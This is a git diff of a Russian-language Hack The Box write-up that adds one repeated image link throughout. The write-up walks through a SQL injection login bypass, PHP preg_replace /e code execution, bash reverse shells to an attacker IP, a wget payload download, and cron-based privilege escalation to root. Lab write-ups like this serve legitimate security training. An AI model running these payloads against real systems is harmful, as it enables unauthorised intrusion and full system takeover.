@@ -7,6 +7,7 @@
 sudo nmap -Pn -n --min-rate=1000 --open 10.129.5.173 -p- -oN discovery/full-tpc
 ```
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529104252.png]]
 
  Сканирование инструментом `nmap` показало три открытых TCP порта: 22, 80 и 443. Попробуем вытащить информацию о сервисах
@@ -15,12 +16,14 @@ sudo nmap -Pn -n --min-rate=1000 --open 10.129.5.173 -p- -oN discovery/full-tpc
 sudo nmap -Pn -n 10.129.5.173 -p 22,80,443 -sC -sV -oN discovery/tcp-services
 ```
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529104440.png]]
 
 Из данных SSL сертификата мы видим домен `europacorp.htb` и его субдомены `www.europacorp.htb` и `admin-portal.europacorp.htb`. 
 
 Я решил подробнее рассмотреть сертификат и обнаружил в нем почту `admin@europacorp.htb`
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529104630.png]]
 
 Добавим домены в `/etc/hosts` 
@@ -36,6 +39,7 @@ echo "10.129.5.173 www.europacorp.htb admin-portal.europacorp.htb europacorp.htb
 
 Переходим на `admin-portal.europacorp.htb` и видим форму входа, которая принимает email и пароль
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529104824.png]]
 
 Я попробовал использовать несколько часто встречаемых паролей в связке с найденной почтой `admin@europacorp.htb`, но это не привело к результату
@@ -46,6 +50,7 @@ echo "10.129.5.173 www.europacorp.htb admin-portal.europacorp.htb europacorp.htb
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '2cfd4560539f887a5e420412b370b361'' at line 1
 ```
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529105352.png]]
 
 Ошибка содержит часть SQL-выражения и указывает на некорректное экранирование пользовательского ввода, что подтверждает наличие уязвимости. Чаще всего подобные формы под капотом генерируют подобное выражение
@@ -56,24 +61,29 @@ $query = "SELECT * FROM users WHERE email = '$email' AND password = '$password'"
 
 Попробуем обойти форму, завершив строковый литерал и закомментировав остаток SQL-запроса. В качестве почты используем найденную в SSL-сертификате.
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ```
 admin@europacorp.htb'-- -
 ```
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529105655.png]]
 
 И получаем редирект на `/dashboard.php`
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529110251.png]]
 
 ### `preg_replace()` to RCE
 
 Рассмотрим страницу. Мы видим много нерабочих ссылок и вкладку Tools, где можно сгенерировать openvpn конфигурацию. В качестве ввода мы передаем IP-адрес и получаем в ответ готовый конфиг
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529110354.png]]
 
 Если пропустить запрос через Burp, мы увидим, что передается текст конфигурации, паттерн `\ip_address\` и поле IP-адреса, которое вставляется в конфигурацию
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529110501.png]]
 
 Сперва я подумал, что имею дело с template engine и потратил некоторое время на тестирование SSTI, что не дало никаких результатов. Поэтому я решил копать в сторону regexp выражений
@@ -99,6 +109,7 @@ ipaddress=system("id");
 
 И получил в ответ вывод команды `id`, что подтверждает наличие уязвимости
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529110849.png]]
 
 Попробуем создать обратный шелл. Для этого я использовал следующую полезную нагрузку
@@ -119,6 +130,7 @@ pattern=/ip_address/e&ipaddress=system("bash -i >& /dev/tcp/10.10.14.123/9001 0>
 nc -lvnp 9001
 ```
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529102225.png]]
 
 ---
@@ -132,14 +144,17 @@ export TERM=xterm
 stty raw -echo; fg
 ```
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529102401.png]]
 
 В файле `/var/www/admin/db.php` я нашел логин и пароль пользователя `john`. Вывод `cat /etc/passwd` показал, что такой же пользователь существует в системе Я попробовал использовать полученные данные, но они не подошли, поэтому я продолжил поиски. 
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529102457.png]]
 
 Я начал рассматривать webroot и нашел файл `/var/www/cronjobs/clearlogs`. Оказалось, что это php скрипт, который очищает файл access.log и запускает скрипт по пути `/var/www/cmd/logcleared.sh`
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529103021.png]]
 
 ```php
@@ -157,10 +172,12 @@ exec('/var/www/cmd/logcleared.sh');
 cat /etc/crontab
 ```
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529111348.png]]
 
 Я решил посмотреть файл `logcleared.sh`, но не обнаружил его. Но я заметил, что целевая папка доступна для записи пользователям группы `www-data`, к которой мы относимся. Это позволит записать свой скрипт, который выполнится от имени root пользователя после старта cron-задачи.
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529103130.png]]
 
 В качестве нагрузки я решил использовать еще один reverse shell.
@@ -171,7 +188,7 @@ cat /etc/crontab
 bash -c "bash -i >& /dev/tcp/10.10.14.123/9002 0>&1"
 ```
 
-
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529103310.png]]
 
 Сохраняем файл в `/var/www/cmd` и даем ему права на исполнение.
@@ -181,6 +198,7 @@ wget http://10.10.14.123:8000/logcleared.sh -C /var/www/cmd
 chmod +x /var/www/cmd/logcleared.sh
 ```
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529103547.png]]
 
 Запускаем слушателя и ждем. Через несколько секунд получаем приглашение от root-пользователя
@@ -189,6 +207,7 @@ chmod +x /var/www/cmd/logcleared.sh
 nc -lvnp 9002
 ```
 
+![alt text](https://github.com/zhabii/htb-writeups/blob/main/media/attacking%20common%20applications/Pasted%20image%2020260321203803.png)
 ![[Pasted image 20260529103810.png]]
 
 ---
